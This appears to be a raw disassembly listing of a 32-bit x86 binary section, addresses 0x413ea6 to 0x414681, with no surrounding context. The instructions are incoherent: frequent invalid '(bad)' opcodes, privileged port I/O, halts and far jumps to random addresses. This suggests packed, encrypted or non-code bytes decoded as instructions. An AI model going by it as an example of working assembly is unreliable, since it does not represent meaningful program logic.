  413ea6:	fdivr  QWORD PTR [ebp+0x14141427]
  413eac:	jge    0x413e59
  413eae:	arpl   cx,cx
  413eb0:	or     dl,0xea
  413eb3:	pop    ebp
  413eb4:	adc    ah,BYTE PTR [edi-0x3c]
  413eb7:	(bad)  
  413eb8:	add    BYTE PTR [ecx-0x7d38b3be],0xdb
  413ebf:	sub    DWORD PTR [ebx],ebp
  413ec1:	retf   
  413ec2:	mov    ah,0x8a
  413ec4:	icebp  
  413ec5:	xor    edx,DWORD PTR [edi+eiz*8-0x73]
  413ec9:	imul   eax,DWORD PTR [esi-0x174ef4ec],0x874bc7eb
  413ed3:	or     BYTE PTR ds:0x748c6edb,cl
  413ed9:	fidivr WORD PTR [eax+0x7c]
  413edc:	into   
  413edd:	call   0x5ccb2a59
  413ee2:	repnz adc DWORD PTR [ecx-0x2f137a33],ebx
  413ee9:	lahf   
  413eea:	cdq    
  413eeb:	arpl   bx,sp
  413eed:	ins    DWORD PTR es:[edi],dx
  413eee:	rol    BYTE PTR [edx+0x30],cl
  413ef1:	aaa    
  413ef2:	or     dl,BYTE PTR [esi+0x1c374f8d]
  413ef8:	pop    edi
  413ef9:	repz ret 
  413efb:	jl     0x413f4b
  413efd:	dec    ebx
  413efe:	loop   0x413e92
  413f00:	cmp    eax,0xb407a9f5
  413f05:	call   0x89aa6f58
  413f0a:	pop    esi
  413f0b:	mov    cl,0xbd
  413f0d:	daa    
  413f0e:	jae    0x413f6b
  413f10:	mov    cl,0xf6
  413f12:	cdq    
  413f13:	repz pop ecx
  413f15:	loop   0x413f88
  413f17:	in     al,dx
  413f18:	mov    bh,bh
  413f1a:	in     al,0x32
  413f1c:	test   eax,0x542a4695
  413f21:	mov    edi,0xd97938f3
  413f26:	dec    ebx
  413f27:	aad    0x2d
  413f29:	xor    DWORD PTR [edx-0x41],0xa
  413f2d:	(bad)  
  413f2e:	fbstp  TBYTE PTR [edx-0x1]
  413f31:	imul   ebp,DWORD PTR [edi+0x43],0x7fd080cd
  413f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f39:	adc    al,BYTE PTR [esi-0x743046e]
  413f3f:	nop
  413f40:	pusha  
  413f41:	sahf   
  413f42:	out    dx,al
  413f43:	or     al,0x41
  413f45:	sbb    eax,0xd8c902d6
  413f4a:	sti    
  413f4b:	(bad)  
  413f4c:	push   esi
  413f4d:	jno    0x413f73
  413f4f:	and    DWORD PTR [ebp+0x3c318ef7],edx
  413f55:	jne    0x413fae
  413f57:	sbb    al,BYTE PTR [ecx-0x4f]
  413f5a:	stos   BYTE PTR es:[edi],al
  413f5b:	sbb    al,0x9e
  413f5d:	pop    ecx
  413f5e:	jecxz  0x413f5d
  413f60:	dec    ecx
  413f61:	or     al,0xcb
  413f63:	jge    0x413f9e
  413f65:	and    al,0xea
  413f67:	cmp    BYTE PTR [edx],cl
  413f69:	aaa    
  413f6a:	and    eax,0xd98dd061
  413f6f:	ds popa 
  413f71:	out    dx,al
  413f72:	sbb    edx,DWORD PTR [ebp+0x5f]
  413f75:	ins    BYTE PTR es:[edi],dx
  413f76:	mov    DWORD PTR [ebx],ebx
  413f78:	cmp    eax,0x6a84af88
  413f7d:	dec    BYTE PTR [ebp+0x270c399f]
  413f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f85:	std    
  413f86:	sbb    BYTE PTR ds:0x6bef7f94,bh
  413f8c:	js     0x413feb
  413f8e:	jno    0x413fd6
  413f90:	dec    edx
  413f91:	out    0xad,al
  413f93:	les    esi,FWORD PTR [esi]
  413f95:	sbb    al,0x43
  413f97:	cld    
  413f98:	loope  0x413f64
  413f9a:	retf   0xf397
  413f9d:	pop    ecx
  413f9e:	jmp    0xe58e9d12
  413fa3:	les    edx,FWORD PTR [eax-0x3f]
  413fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa7:	fdivr  DWORD PTR [edi]
  413fa9:	int    0xbe
  413fab:	jecxz  0x413f9c
  413fad:	mov    ebx,0x7a25e0c0
  413fb2:	xor    ebp,esi
  413fb4:	jo     0x414017
  413fb6:	adc    al,0x59
  413fb9:	dec    ecx
  413fba:	push   eax
  413fbb:	mov    WORD PTR [ebx+ecx*8],?
  413fbe:	clc    
  413fbf:	pop    ebx
  413fc0:	mov    esp,DWORD PTR [eax]
  413fc2:	sbb    eax,0x53cd947a
  413fc7:	into   
  413fc8:	retf   0xa978
  413fcb:	rcr    DWORD PTR [edi-0x49],cl
  413fce:	mov    ds:0xd54c1385,eax
  413fd3:	pop    ebx
  413fd4:	popa   
  413fd5:	pop    ebx
  413fd6:	sti    
  413fd7:	mov    esp,0x9bca9880
  413fdc:	sbb    BYTE PTR [eax+ebx*2+0x20],0x45
  413fe1:	sbb    edx,ecx
  413fe3:	sub    edi,eax
  413fe5:	cmp    eax,0xfb5d4115
  413fea:	jge    0x413faa
  413fec:	push   edi
  413fed:	out    dx,eax
  413fee:	pop    ss
  413fef:	push   0x87ac9091
  413ff4:	lock fmul QWORD PTR [ebx+eax*2-0x74cb696]
  413ffc:	aas    
  413ffd:	jp     0x414027
  413fff:	xchg   esi,eax
  414000:	or     dh,BYTE PTR [ecx+0x16d52b2e]
  414006:	test   cl,bh
  414008:	int    0x39
  41400a:	jae    0x413fe0
  41400c:	cli    
  41400d:	mov    bl,0xbe
  41400f:	int    0x3b
  414011:	adc    eax,0x879b5ba9
  414016:	sbb    eax,0x5f389055
  41401b:	push   cs
  41401c:	loop   0x414026
  41401e:	scas   al,BYTE PTR es:[edi]
  41401f:	test   ebp,ebx
  414021:	hlt    
  414022:	adc    BYTE PTR [eax-0x5d92f25d],al
  414028:	fld    DWORD PTR [edi+0x216c92ad]
  41402e:	xchg   ebx,eax
  41402f:	adc    DWORD PTR [esi-0x17],esp
  414032:	mov    DWORD PTR [edx],0x9453f228
  414038:	jecxz  0x414023
  41403a:	push   ss
  41403b:	call   0x4bab:0x82718ccc
  414042:	out    0x4d,eax
  414044:	jp     0x4140c1
  414046:	add    BYTE PTR [edx+0x5f],dl
  414049:	mov    edi,0x684d4dd3
  41404e:	dec    ebp
  41404f:	jnp    0x413fe2
  414051:	outs   dx,DWORD PTR ds:[esi]
  414052:	add    BYTE PTR [eax-0x1b],0x34
  414056:	les    eax,FWORD PTR [esi+0x7632713c]
  41405c:	maskmovq mm3,mm3
  41405f:	push   esp
  414060:	ror    BYTE PTR [eax],1
  414062:	pop    ecx
  414063:	sbb    esi,DWORD PTR ds:[edx+ebp*4+0x17]
  414068:	cmp    esp,DWORD PTR [edi-0x5c168c1a]
  41406e:	inc    ebx
  41406f:	or     eax,0xd49eb9ac
  414074:	not    eax
  414076:	ror    BYTE PTR [ecx],0x83
  414079:	jbe    0x414020
  41407b:	sbb    ecx,DWORD PTR [esi]
  41407d:	add    dh,BYTE PTR [edx-0x17de2f2f]
  414083:	fnstenv [edi+0x39]
  414086:	frstor [esi-0x73]
  414089:	push   0x75
  41408b:	or     edi,ecx
  41408d:	push   ebp
  41408e:	scas   al,BYTE PTR es:[edi]
  41408f:	iret   
  414090:	fidivr WORD PTR [edx+eax*8+0x24430fbe]
  414097:	inc    edx
  414098:	aam    0x6c
  41409a:	out    0xf,al
  41409c:	aam    0xe1
  41409e:	jo     0x414056
  4140a0:	push   ss
  4140a1:	mov    ah,0x7
  4140a3:	adc    al,0x6b
  4140a5:	loope  0x414106
  4140a7:	outs   dx,DWORD PTR ds:[esi]
  4140a8:	daa    
  4140a9:	mov    ecx,0x178d8492
  4140ae:	hlt    
  4140af:	adc    eax,0x793c241
  4140b4:	test   al,0x49
  4140b6:	retf   
  4140b7:	jl     0x41405e
  4140b9:	jmp    0xf4562456
  4140be:	mov    al,ds:0x897e8023
  4140c3:	stc    
  4140c4:	bound  eax,QWORD PTR [ecx]
  4140c6:	cmp    bl,dh
  4140c8:	sbb    DWORD PTR [edi+ebx*1],edx
  4140cb:	sub    BYTE PTR [edi-0x7f],dh
  4140ce:	push   cs
  4140cf:	and    BYTE PTR [edx+0x349d68d5],0xb0
  4140d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140d7:	mov    ds:0x7a7d14fb,eax
  4140dc:	hlt    
  4140dd:	loop   0x414084
  4140df:	push   eax
  4140e0:	test   eax,0x235056a3
  4140e5:	jmp    0x3c6282c5
  4140ea:	push   ds
  4140eb:	or     esp,DWORD PTR [edi]
  4140ed:	inc    ecx
  4140ee:	pop    ss
  4140ef:	repnz aad 0x2a
  4140f2:	pusha  
  4140f3:	gs sub DWORD PTR fs:[esi+0x1ff7cc11],edi
  4140fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140fc:	add    BYTE PTR [eax+edx*1-0x69],al
  414100:	or     edx,ecx
  414102:	pop    ds
  414103:	jmp    0x6b50:0xecf3d9ca
  41410a:	mov    ebx,0xf17b091b
  41410f:	sbb    al,0xb4
  414111:	outs   dx,DWORD PTR ds:[esi]
  414112:	cmp    eax,DWORD PTR [ebx-0x2a1734e0]
  414118:	jb     0x41414f
  41411a:	(bad)  
  41411b:	sar    bh,1
  41411d:	stos   BYTE PTR es:[edi],al
  41411e:	addr16 adc ah,bh
  414121:	cli    
  414122:	jnp    0x4141a0
  414124:	sbb    eax,0xbd419031
  414129:	xchg   edi,eax
  41412a:	loope  0x414116
  41412c:	int    0x47
  41412e:	imul   ebx,DWORD PTR [edx+edi*2],0x87bd764b
  414135:	sub    ebp,esi
  414137:	push   cs
  414138:	xchg   esp,eax
  414139:	inc    ecx
  41413a:	or     ecx,DWORD PTR [ecx+0x12]
  41413d:	popa   
  41413e:	js     0x414115
  414140:	cmp    BYTE PTR [ecx-0x11],dh
  414143:	scas   eax,DWORD PTR es:[edi]
  414144:	push   edi
  414145:	out    dx,al
  414146:	jle    0x414189
  414148:	les    esi,FWORD PTR [edx+0x6e0d53e]
  41414e:	mov    bl,0xc1
  414150:	(bad)  
  414152:	dec    ebp
  414153:	daa    
  414154:	stos   BYTE PTR es:[edi],al
  414155:	mov    edx,0x24d3f0a3
  41415a:	mov    eax,ds:0x3562684c
  41415f:	inc    ebp
  414160:	jo     0x4141b9
  414162:	ins    DWORD PTR es:[edi],dx
  414163:	mov    ah,0xbe
  414165:	sub    DWORD PTR [edi+0x6c0b28bd],ebp
  41416b:	lahf   
  41416c:	mov    ecx,0x5c2ebf01
  414171:	fisub  WORD PTR [ebx]
  414173:	sar    dh,cl
  414175:	frstor [eax]
  414177:	adc    eax,0x89a040fe
  41417c:	loop   0x4141f3
  41417e:	in     al,0xef
  414180:	(bad)  
  414181:	pop    eax
  414182:	jns    0x4141b5
  414184:	xor    bl,BYTE PTR [edi+0x71]
  414187:	(bad)  
  414188:	cli    
  414189:	mov    ds:0x3059e7c7,eax
  41418e:	shl    BYTE PTR [ebx],1
  414190:	cmc    
  414191:	(bad)  
  414193:	add    BYTE PTR [eax+0x31aeab72],cl
  414199:	dec    ecx
  41419a:	sbb    DWORD PTR [esi+0x21],0xffffffc3
  41419e:	lea    edx,[ecx-0x37e37d13]
  4141a4:	pop    ebp
  4141a5:	arpl   cx,dx
  4141a7:	push   0x3
  4141a9:	sbb    DWORD PTR [esi+0x5b],0x2ad09a9c
  4141b0:	sti    
  4141b1:	arpl   WORD PTR [ebx],dx
  4141b3:	ret    0x1f84
  4141b6:	push   es
  4141b7:	xor    al,0xc4
  4141b9:	call   0x38f1:0xd1d08ed4
  4141c0:	mov    dh,0xd7
  4141c2:	add    eax,edx
  4141c4:	xchg   edx,eax
  4141c5:	addr16 sbb eax,0x31443255
  4141cb:	mov    DWORD PTR [edi+0x77],0xb4985e08
  4141d2:	out    0x45,al
  4141d4:	cmp    ebp,0xbb3f0043
  4141da:	and    esp,DWORD PTR [ebx-0x3c2b58ef]
  4141e0:	xor    BYTE PTR [esi],dh
  4141e2:	scas   al,BYTE PTR es:[edi]
  4141e3:	or     DWORD PTR [eax-0x39],esp
  4141e6:	pop    esi
  4141e7:	mov    edi,0xc69e69fa
  4141ec:	xchg   esp,eax
  4141ed:	shr    BYTE PTR ds:0xfa9f460d,cl
  4141f3:	mov    ecx,0x87d4ea60
  4141f8:	rcr    BYTE PTR [esi*1+0x57705359],0xb4
  414200:	pop    ds
  414201:	inc    ebp
  414202:	xor    bl,cl
  414204:	adc    al,0x5d
  414206:	iret   
  414207:	sub    al,BYTE PTR [ebp+0x3e8d988d]
  41420d:	jo     0x414235
  41420f:	imul   edi
  414211:	into   
  414212:	sti    
  414213:	test   al,0xdb
  414215:	frstor [ecx]
  414217:	jmp    0xbd6e:0x1e7b0a7d
  41421e:	dec    edx
  41421f:	and    DWORD PTR [edx+0x54a8bb50],esp
  414225:	adc    al,0x82
  414227:	mov    WORD PTR [eax],?
  414229:	xchg   ebp,eax
  41422a:	jg     0x414240
  41422c:	sub    eax,0x8e5216e1
  414231:	jle    0x4141df
  414233:	pop    esp
  414234:	arpl   WORD PTR [eax-0x29],ax
  414237:	push   0x36
  414239:	or     eax,0x2a6b47ef
  41423e:	xor    BYTE PTR [ebx],0x1c
  414241:	inc    esp
  414242:	out    dx,eax
  414243:	sub    BYTE PTR [edx+0x54a84197],dl
  414249:	sub    BYTE PTR [ebx+ebx*2+0x36756d68],ah
  414250:	mov    WORD PTR es:[eax],cs
  414253:	jmp    0x4142d1
  414255:	scas   eax,DWORD PTR es:[edi]
  414256:	ror    edi,1
  414258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414259:	inc    eax
  41425a:	ret    
  41425b:	jmp    0x4142cc
  41425d:	fwait
  41425e:	minps  xmm7,XMMWORD PTR [esi+0x32c1cfcf]
  414265:	jl     0x414215
  414267:	cwde   
  414268:	sar    DWORD PTR [ebp-0x70a6b0fc],cl
  41426e:	adc    bh,bl
  414270:	lods   al,BYTE PTR ds:[esi]
  414271:	rcl    dh,0x87
  414274:	retf   0xcc28
  414277:	mov    ds:0xa00a26d,eax
  41427c:	xchg   edi,eax
  41427d:	and    ebx,DWORD PTR ds:0xa92c1c18
  414283:	shl    BYTE PTR [ebp-0x18],1
  414286:	fisub  WORD PTR [edi-0x58]
  414289:	and    al,0xc1
  41428b:	sub    edx,DWORD PTR ds:0xd4e5383a
  414291:	and    ecx,DWORD PTR [eax]
  414293:	popfw  
  414295:	sbb    BYTE PTR [edx+0x1866a958],dh
  41429b:	adc    al,0xb0
  41429d:	fs add ch,dl
  4142a0:	popf   
  4142a1:	cmc    
  4142a2:	adc    al,0x25
  4142a4:	mov    ah,0x28
  4142a6:	jne    0x41431d
  4142a8:	jle    0x41429f
  4142aa:	inc    ecx
  4142ab:	add    DWORD PTR [ecx],edx
  4142ad:	xor    al,0xab
  4142af:	sub    eax,0x8afe8b28
  4142b4:	mov    ecx,0xb8451f9c
  4142b9:	dec    edi
  4142ba:	jmp    0x93f2fd76
  4142bf:	loop   0x414279
  4142c1:	sbb    esi,0x1ddddb16
  4142c7:	fadd   st(4),st
  4142c9:	push   ebx
  4142ca:	out    dx,eax
  4142cb:	mul    dh
  4142cd:	(bad)  
  4142ce:	lds    ebp,FWORD PTR [esi]
  4142d0:	ficomp WORD PTR [edi+0x219f01d2]
  4142d6:	outs   dx,DWORD PTR ds:[esi]
  4142d7:	imul   ebx,eax,0x26780501
  4142dd:	jle    0x41432e
  4142df:	mov    cl,0xe2
  4142e1:	xor    BYTE PTR [edi-0x18a99d1a],ch
  4142e7:	gs stc 
  4142e9:	(bad)  
  4142ea:	shl    DWORD PTR [ebp+edi*1+0x4e],cl
  4142ee:	adc    al,0xc2
  4142f0:	push   esp
  4142f1:	cld    
  4142f2:	fimul  DWORD PTR [eax-0x488ad194]
  4142f8:	xchg   ebp,eax
  4142f9:	lods   eax,DWORD PTR ds:[esi]
  4142fa:	jge    0x41431c
  4142fc:	rcl    BYTE PTR [ecx+0x421522e9],cl
  414302:	pop    ebp
  414303:	(bad)  
  414304:	(bad)  
  414305:	in     al,dx
  414306:	mov    dh,0xdd
  414308:	add    BYTE PTR [ebp+0x2afd0afe],bh
  41430e:	retf   
  41430f:	inc    DWORD PTR [esi]
  414311:	or     ebp,esp
  414313:	and    BYTE PTR [eax],dl
  414315:	es mov ?,edi
  414318:	mov    al,0xdc
  41431a:	in     al,0x88
  41431c:	sbb    eax,0x153a1130
  414321:	pop    esi
  414322:	sub    eax,0x37df7c48
  414327:	aad    0xdd
  414329:	push   edi
  41432a:	dec    DWORD PTR [edx]
  41432c:	push   esi
  41432d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41432e:	jb     0x41437c
  414330:	inc    edx
  414331:	fs xor ebp,eax
  414334:	jbe    0x41437b
  414336:	mov    ds:0x6003cdd3,al
  41433b:	mov    BYTE PTR [edi-0x78],bh
  41433e:	xor    al,0x4d
  414340:	and    DWORD PTR [ebx-0x1c],edi
  414343:	xchg   BYTE PTR [esi],ch
  414345:	jecxz  0x414344
  414347:	call   0xdfef486f
  41434c:	pusha  
  41434d:	dec    edx
  41434e:	xchg   ebp,eax
  41434f:	(bad)  
  414350:	outs   dx,DWORD PTR ds:[esi]
  414351:	das    
  414352:	or     BYTE PTR [ebx+0x46c3b40f],cl
  414358:	pop    esp
  414359:	sbb    al,0x29
  41435b:	inc    ebp
  41435c:	shl    cl,1
  41435e:	xchg   ebx,eax
  41435f:	fnsave [ebx+edx*1+0x31]
  414363:	mov    al,ds:0x9ba18bc3
  414368:	in     eax,dx
  414369:	jmp    0xbde0:0xabc036de
  414370:	out    0x77,eax
  414372:	and    dl,BYTE PTR [ebp+0x855c25b]
  414378:	jae    0x4143cb
  41437a:	inc    ebx
  41437b:	pop    ebp
  41437c:	int3   
  41437d:	and    al,0xd6
  41437f:	pop    esp
  414380:	inc    esi
  414381:	sbb    al,0x37
  414383:	test   cl,al
  414385:	push   esi
  414386:	add    edx,DWORD PTR [esi+0x60a51bf8]
  41438c:	pop    esp
  41438d:	int3   
  41438e:	sub    cl,BYTE PTR [ebx+0x425ba98b]
  414394:	mov    ebx,DWORD PTR [edi]
  414396:	cmp    bh,bl
  414398:	pop    ebp
  414399:	mov    dh,0xf4
  41439b:	mov    al,ds:0x8eaea3a9
  4143a0:	aad    0x6e
  4143a2:	or     DWORD PTR [eax+0x5a],ebp
  4143a5:	int3   
  4143a6:	add    al,0x7e
  4143a8:	push   ss
  4143a9:	xor    dh,BYTE PTR [eax+0x1fe35505]
  4143af:	ins    DWORD PTR es:[edi],dx
  4143b0:	stos   BYTE PTR es:[edi],al
  4143b1:	out    0x6c,al
  4143b3:	jns    0x4143f4
  4143b5:	iret   
  4143b6:	xchg   edx,eax
  4143b7:	xchg   ebp,eax
  4143b8:	ins    BYTE PTR es:[edi],dx
  4143b9:	icebp  
  4143ba:	in     eax,dx
  4143bb:	or     edi,DWORD PTR [ebp+0x2c]
  4143be:	es sub eax,0xe269d875
  4143c4:	clc    
  4143c5:	in     al,dx
  4143c6:	mov    ds:0xd4e37eb0,al
  4143cb:	fdiv   QWORD PTR [ecx-0x47]
  4143ce:	ret    
  4143cf:	add    esi,DWORD PTR [esi-0x54]
  4143d2:	push   esi
  4143d3:	in     eax,0x42
  4143d5:	xor    eax,0x1d54551
  4143da:	out    dx,eax
  4143db:	push   ds
  4143dc:	daa    
  4143dd:	cmp    al,BYTE PTR [ebp-0x35]
  4143e0:	xor    esi,esi
  4143e2:	lods   al,BYTE PTR ds:[esi]
  4143e3:	ret    
  4143e4:	pop    edx
  4143e5:	ret    
  4143e6:	ins    DWORD PTR es:[edi],dx
  4143e7:	in     eax,dx
  4143e8:	or     DWORD PTR [ebx-0x344cd812],esi
  4143ee:	xor    dh,0xdf
  4143f1:	pop    ss
  4143f2:	pushf  
  4143f3:	or     ecx,DWORD PTR [ecx]
  4143f5:	(bad)  
  4143f6:	xchg   edi,eax
  4143f7:	jp     0x41442e
  4143f9:	inc    eax
  4143fa:	test   al,bl
  4143fc:	xchg   edi,eax
  4143fd:	dec    esp
  4143fe:	outs   dx,DWORD PTR ds:[esi]
  4143ff:	cli    
  414400:	(bad)  
  414402:	cmp    esi,ecx
  414404:	(bad)  
  414405:	add    ebp,ecx
  414407:	lds    eax,FWORD PTR [ebx]
  414409:	mov    edx,DWORD PTR [ecx+0x6f]
  41440c:	mov    edx,0x5cd72d13
  414411:	sbb    eax,DWORD PTR [edx+0x4a]
  414414:	push   ds
  414415:	or     al,0x3e
  414417:	std    
  414418:	call   0x6a50:0x7a4ae80d
  41441f:	inc    eax
  414420:	inc    BYTE PTR [edi+ecx*1-0x7bb6beb4]
  414427:	in     al,dx
  414428:	add    dl,dl
  41442a:	adc    ah,dl
  41442c:	sbb    DWORD PTR [ebx],edi
  41442e:	sub    DWORD PTR [eax+0x70],edi
  414431:	mov    al,ds:0x82fe3173
  414436:	mov    dh,0xb0
  414438:	ins    DWORD PTR es:[edi],dx
  414439:	enter  0xf36,0x1b
  41443d:	jmp    0xabb32076
  414442:	mov    al,0xf0
  414444:	pop    ss
  414445:	push   esp
  414446:	aas    
  414447:	test   al,0x9e
  414449:	cmp    ebp,ebx
  41444b:	out    dx,al
  41444c:	into   
  41444d:	hlt    
  41444e:	(bad)  
  41444f:	ror    BYTE PTR [ebx],1
  414451:	pop    ss
  414452:	jmp    0x709:0xfb742906
  414459:	push   ecx
  41445a:	adc    al,0x1e
  41445c:	mov    ecx,0xcb988248
  414461:	push   ebp
  414462:	fcomi  st,st(7)
  414464:	idiv   BYTE PTR [eax]
  414466:	repnz xor ah,BYTE PTR [ecx]
  414469:	movups XMMWORD PTR [ebp+0xc],xmm5
  41446d:	je     0x41443f
  41446f:	dec    ebx
  414470:	jnp    0x4144b2
  414472:	xchg   BYTE PTR [edx+0x11],dh
  414475:	mov    dh,0x37
  414477:	jae    0x414480
  414479:	inc    esi
  41447a:	fs mov ebx,0x3a40ccfc
  414480:	dec    eax
  414481:	test   al,0x48
  414483:	push   esi
  414484:	out    dx,eax
  414485:	add    al,0xc3
  414487:	shl    bl,1
  414489:	jae    0x414509
  41448b:	rcl    esi,1
  41448d:	aam    0x4e
  41448f:	xchg   DWORD PTR ds:0x6d20e51d,edi
  414495:	mov    bh,0x5c
  414498:	xchg   ebx,eax
  414499:	lds    ecx,FWORD PTR [ebx+0x3bac6d25]
  41449f:	sbb    esp,DWORD PTR [eax]
  4144a1:	mov    eax,ds:0xee63b897
  4144a6:	or     esi,DWORD PTR [edi-0x10db5823]
  4144ac:	add    al,0x9
  4144ae:	loopne 0x41449d
  4144b0:	sub    ebx,ebp
  4144b2:	cs stc 
  4144b4:	ret    
  4144b5:	out    dx,eax
  4144b6:	xchg   edi,eax
  4144b7:	ds sbb al,0x52
  4144ba:	sti    
  4144bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144bc:	pop    ebp
  4144bd:	and    al,0xfb
  4144bf:	addr16 out 0x4d,al
  4144c2:	jbe    0x41449b
  4144c4:	popa   
  4144c5:	ins    DWORD PTR es:[edi],dx
  4144c6:	in     eax,0xa6
  4144c8:	fs push ss
  4144ca:	out    0x42,al
  4144cc:	fsubr  DWORD PTR [esi]
  4144ce:	(bad)  
  4144cf:	sub    BYTE PTR [edi-0x15],ah
  4144d2:	jp     0x414532
  4144d4:	fwait
  4144d5:	mov    edi,0xb6013b2d
  4144da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144db:	pop    edx
  4144dc:	in     eax,dx
  4144dd:	add    ah,dh
  4144df:	and    eax,0xb9c71a29
  4144e4:	pop    ss
  4144e5:	cmp    edx,DWORD PTR [eax]
  4144e7:	jle    0x4144d0
  4144e9:	or     DWORD PTR [ecx],edi
  4144eb:	inc    edi
  4144ec:	cmp    bh,BYTE PTR [edi+ebp*1+0x72]
  4144f0:	or     edi,DWORD PTR [ecx]
  4144f2:	aas    
  4144f3:	int3   
  4144f4:	ins    BYTE PTR es:[edi],dx
  4144f5:	and    dl,bl
  4144f7:	test   DWORD PTR [esi+eiz*1+0x2a],edi
  4144fb:	in     al,0x51
  4144fd:	popa   
  4144fe:	cli    
  4144ff:	xor    DWORD PTR [eax],ebp
  414501:	or     ecx,DWORD PTR [esi-0x715a7aaf]
  414507:	test   BYTE PTR ds:0xb5a029,bl
  41450d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41450e:	dec    ebp
  41450f:	mov    WORD PTR [ebp+0x79],ss
  414512:	mov    edx,0xa92e849c
  414517:	aas    
  414518:	mov    WORD PTR [eax-0x50],?
  41451b:	mov    ecx,DWORD PTR [esi+eiz*1+0x6a]
  41451f:	fucom  st(6)
  414521:	loop   0x414507
  414523:	loopne 0x4144e8
  414525:	push   0xe7f36386
  41452a:	outs   dx,DWORD PTR ds:[esi]
  41452b:	cli    
  41452c:	push   ds
  41452d:	cwde   
  41452e:	test   eax,0xc1716d4a
  414533:	dec    ecx
  414534:	sbb    DWORD PTR [ebx+0x225aa896],0x4d
  41453b:	mov    ebx,0xbbaf2689
  414540:	jnp    0x41452a
  414542:	mov    al,ds:0xe4839e0a
  414547:	lahf   
  414548:	and    DWORD PTR ds:0x65ddba36,0xffffffce
  41454f:	dec    edx
  414550:	xor    DWORD PTR [edx+0x5b],edi
  414553:	sbb    ebp,DWORD PTR [esi+ecx*2-0x3e]
  414557:	adc    eax,0xc5e9b870
  41455c:	adc    BYTE PTR [edx],dh
  41455e:	hlt    
  41455f:	fdiv   QWORD PTR [esi-0x11f9bc39]
  414565:	cdq    
  414566:	mov    bl,0x1a
  414568:	lea    edx,[esi+edx*2+0x68]
  41456c:	outs   dx,BYTE PTR ds:[esi]
  41456d:	mov    dh,0x8a
  41456f:	mov    cl,cl
  414571:	jo     0x414572
  414573:	sbb    eax,0xfbc2960c
  414578:	pop    edx
  414579:	dec    edx
  41457a:	repz ret 0xa246
  41457e:	pusha  
  41457f:	and    al,0x74
  414581:	pop    ecx
  414582:	shl    DWORD PTR [edx],cl
  414584:	scas   eax,DWORD PTR es:[edi]
  414585:	cwde   
  414586:	outs   dx,DWORD PTR ds:[esi]
  414587:	or     ecx,ebp
  414589:	push   ds
  41458a:	push   0x21
  41458c:	icebp  
  41458d:	rol    DWORD PTR ss:[edi+0x2b7e71e1],cl
  414594:	iret   
  414595:	xlat   BYTE PTR ds:[ebx]
  414596:	lods   al,BYTE PTR ds:[esi]
  414597:	jns    0x414614
  414599:	out    0x2e,al
  41459b:	push   ds
  41459c:	lods   eax,DWORD PTR ds:[esi]
  41459d:	dec    esp
  41459e:	adc    BYTE PTR ss:[edx+0x22],dl
  4145a2:	and    al,0x1b
  4145a4:	pop    esp
  4145a5:	pop    ss
  4145a6:	aam    0x3f
  4145a8:	inc    ebx
  4145a9:	ror    BYTE PTR cs:[ebx-0x77867a9f],cl
  4145b0:	out    0x51,eax
  4145b2:	dec    ebp
  4145b3:	gs mov cl,0x2f
  4145b6:	mov    edi,0xa184938c
  4145bb:	scas   eax,DWORD PTR es:[edi]
  4145bc:	js     0x41462b
  4145be:	imul   esp,DWORD PTR [eax+0x5eabed8a],0xbacf2bde
  4145c8:	and    eax,0x97fad738
  4145cd:	dec    ecx
  4145ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145cf:	retf   
  4145d0:	mov    esp,0xabf936b9
  4145d5:	push   edi
  4145d6:	fimul  WORD PTR [eax+0x558749e3]
  4145dc:	jno    0x41460b
  4145de:	aaa    
  4145df:	mov    al,0x42
  4145e1:	fs pushf 
  4145e3:	jns    0x41463c
  4145e5:	in     eax,0x8c
  4145e7:	add    DWORD PTR [edi],edi
  4145e9:	imul   esi,ebx,0x31fed1f2
  4145ef:	rcr    BYTE PTR [edi-0xd],0xf8
  4145f3:	mov    ebx,0xe88ba584
  4145f8:	pop    ds
  4145f9:	jbe    0x41465e
  4145fb:	test   al,0xd4
  4145fd:	pop    eax
  4145fe:	in     eax,0x19
  414600:	(bad)  
  414602:	pop    edx
  414603:	mov    al,ds:0xcfdc4e3e
  414608:	mov    bl,BYTE PTR [edx]
  41460a:	xchg   ebx,eax
  41460b:	das    
  41460c:	and    al,0x8f
  41460e:	in     al,0xfd
  414610:	leave  
  414611:	or     dl,cl
  414613:	retf   0x638e
  414616:	out    0x10,eax
  414618:	es xchg ecx,eax
  41461a:	imul   eax,DWORD PTR [edx+0x3bf061a],0xf93399e1
  414624:	add    bh,BYTE PTR [edi-0x7f]
  414627:	fisttp DWORD PTR [eax-0x60432585]
  41462d:	cdq    
  41462e:	(bad)  
  41462f:	scas   eax,DWORD PTR es:[edi]
  414630:	pusha  
  414631:	loop   0x41467b
  414633:	arpl   WORD PTR [eax],si
  414635:	loop   0x4146a8
  414637:	fistp  DWORD PTR [edi]
  414639:	bound  eax,QWORD PTR [edx]
  41463b:	add    edx,esi
  41463d:	xor    DWORD PTR [esi-0x122a2d33],ecx
  414643:	mov    dh,0xbd
  414645:	jo     0x4145fb
  414647:	je     0x414681
  414649:	jns    0x414662
  41464b:	jno    0x414638
  41464d:	les    edx,FWORD PTR [ebx]
  41464f:	(bad)  
  414651:	in     al,0xd4
  414653:	out    dx,eax
  414654:	call   0xde49133a
  414659:	fcmovu st,st(3)
  41465b:	inc    esp
  41465c:	fist   WORD PTR [ecx-0x669722a8]
  414662:	mov    esp,DWORD PTR [edi+ebp*4-0x63]
  414666:	test   al,dh
  414668:	jl     0x41469b
  41466a:	lods   eax,DWORD PTR ds:[esi]
  41466b:	call   0xe2d55fb2
  414670:	test   BYTE PTR [ecx+0x62b27ea7],dh
  414676:	push   edi
  414677:	retf   
  414678:	outs   dx,DWORD PTR ds:[esi]
  414679:	sub    BYTE PTR [ecx],bh
  41467b:	enter  0x350e,0x7c
  41467f:	mov    ah,0x3f
  414681:	dec    edi
